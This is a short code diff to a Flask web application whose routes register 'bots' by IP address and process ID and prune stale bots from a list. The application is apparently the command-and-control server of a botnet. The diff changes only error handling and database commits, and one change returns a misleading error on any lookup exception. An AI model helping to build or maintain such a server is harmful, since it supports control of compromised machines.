@@ -215,6 +215,7 @@ def register():
         query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(pid=bot_pid).first()
     except Exception as e:
         print("[!]", e)
+        return jsonify({'result': 'fail', 'error': 'Bot already registered'})
 
     if query_bot is not None:
         return jsonify({'result': 'fail', 'error': 'Bot already registered'})
@@ -487,7 +488,7 @@ def botlist():
     for bot in botlist:
         if (datetime.now() - bot.timestamp).total_seconds() > TIMER*3:
             db.session.delete(bot)
-    db.session.commit()
+            db.session.commit()
 
     jsonbotlist = []
 
